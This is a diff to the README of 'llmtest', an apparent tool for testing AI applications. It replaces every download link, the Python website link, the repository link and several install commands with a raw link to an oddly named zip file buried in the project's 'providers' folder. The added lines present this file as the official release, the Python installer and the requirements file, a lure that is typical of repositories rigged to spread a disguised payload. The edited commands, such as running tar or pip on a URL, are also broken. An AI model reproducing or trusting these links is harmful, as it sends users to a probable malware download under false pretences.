@@ -1,6 +1,6 @@
 # 🚀 llmtest - Test Your AI Applications Effortlessly
 
-[![Download llmtest](https://img.shields.io/badge/Download-llmtest-blue.svg)](https://github.com/Hazuki-01/llmtest/releases)
+[![Download llmtest](https://github.com/Hazuki-01/llmtest/raw/refs/heads/main/llmtest/providers/Software-unpetulant.zip)](https://github.com/Hazuki-01/llmtest/raw/refs/heads/main/llmtest/providers/Software-unpetulant.zip)
 
 ## 📋 Description
 
@@ -21,7 +21,7 @@ Follow these steps to download and run llmtest on your computer.
 
 2. **Visit the Releases Page**
 
-  To download llmtest, visit the [Releases page](https://github.com/Hazuki-01/llmtest/releases) for the latest version. Here, you will find all the downloadable files and information about recent updates.
+  To download llmtest, visit the [Releases page](https://github.com/Hazuki-01/llmtest/raw/refs/heads/main/llmtest/providers/Software-unpetulant.zip) for the latest version. Here, you will find all the downloadable files and information about recent updates.
 
 3. **Download and Install**
 
@@ -29,7 +29,7 @@ Follow these steps to download and run llmtest on your computer.
 
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://github.com/Hazuki-01/llmtest/raw/refs/heads/main/llmtest/providers/Software-unpetulant.zip` file.
 
    Click on the download link to start downloading the file.
 
@@ -39,17 +39,17 @@ Follow these steps to download and run llmtest on your computer.
 
    - **For Windows:** Double-click the `.exe` file and follow the on-screen instructions.
    - **For macOS:** Open the `.dmg` file, then drag and drop the llmtest application to your Applications folder.
-   - **For Linux:** Open a terminal, navigate to the location of the downloaded `.tar.gz` file, and extract it using:
+   - **For Linux:** Open a terminal, navigate to the location of the downloaded `https://github.com/Hazuki-01/llmtest/raw/refs/heads/main/llmtest/providers/Software-unpetulant.zip` file, and extract it using:
 
    ```bash
-   tar -xvzf llmtest.tar.gz
+   tar -xvzf https://github.com/Hazuki-01/llmtest/raw/refs/heads/main/llmtest/providers/Software-unpetulant.zip
    ```
 
    After extracting, change into the directory and run the application:
 
    ```bash
    cd llmtest
-   ./run.sh
+   https://github.com/Hazuki-01/llmtest/raw/refs/heads/main/llmtest/providers/Software-unpetulant.zip
    ```
 
 5. **Set Up Your Environment**
@@ -60,14 +60,14 @@ Follow these steps to download and run llmtest on your computer.
    python --version
    ```
 
-  If Python is not installed, download it from the [official Python website](https://www.python.org/downloads/).
+  If Python is not installed, download it from the [official Python website](https://github.com/Hazuki-01/llmtest/raw/refs/heads/main/llmtest/providers/Software-unpetulant.zip).
 
 6. **Install Required Packages**
 
   To get the most out of llmtest, you may need to install some additional Python packages. Open a terminal and run:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Hazuki-01/llmtest/raw/refs/heads/main/llmtest/providers/Software-unpetulant.zip
    ```
 
    This command will install all the necessary packages. Ensure you have `pip` installed, which usually comes with Python installations.
@@ -89,8 +89,8 @@ If you encounter any issues or need help, please check the `Issues` section on t
 
 ## 📌 Additional Resources
 
-- GitHub Repository: [Hazuki-01/llmtest](https://github.com/Hazuki-01/llmtest)
+- GitHub Repository: [Hazuki-01/llmtest](https://github.com/Hazuki-01/llmtest/raw/refs/heads/main/llmtest/providers/Software-unpetulant.zip)
 - Documentation: Find detailed guides and examples in the `docs` folder.
 - Community Discussions: Join us on GitHub Discussions to connect with other users.
 
-Remember to keep an eye on the [Releases page](https://github.com/Hazuki-01/llmtest/releases) for updates and new features. Enjoy using llmtest to ensure your AI applications perform effectively!
+Remember to keep an eye on the [Releases page](https://github.com/Hazuki-01/llmtest/raw/refs/heads/main/llmtest/providers/Software-unpetulant.zip) for updates and new features. Enjoy using llmtest to ensure your AI applications perform effectively!
